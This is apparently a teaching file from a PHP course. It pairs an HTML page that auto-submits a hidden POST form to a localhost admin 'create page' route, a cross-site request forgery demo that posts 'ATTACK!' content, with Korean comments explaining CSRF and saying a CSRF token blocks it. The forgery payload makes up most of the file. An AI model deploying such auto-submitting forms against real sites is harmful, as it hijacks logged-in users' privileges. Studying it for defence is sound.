<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Attack!</title>
</head>
<body>
    <form method="POST" action="http://localhost/php/section31/index.php?route=admin/pages/create">
        <input type="hidden" name="title" value="ATTACK!">
        <input type="hidden" name="slug" value="attack">
        <input type="hidden" name="content" value="Your System is overtaken now!">
        <input type="submit" id="submit">
    </form>
    <script>
        document.addEventListener('DOMContentLoaded', () => {
            document.getElementById('submit').click();
        })
    </script>
</body>
</html>

<?php

// CSRF(Cross-Site Request Forgery): 사용자가 인증된 웹사이트에 로그인한 상태에서 공격자가 사용자의 의도와는 상관없는 악의적인 요청을 대신 보내도록 유도하는 보안 공격

// 이메일로 보내진 실수로 클릭해서 해당 페이지를 열어보는 것만으로 자동적으로 내 시스템이 탈취당할 수 있음!

// csrf 토큰 적용 후 해당 페이지를 다시 요청해보면 막힌 것을 확인!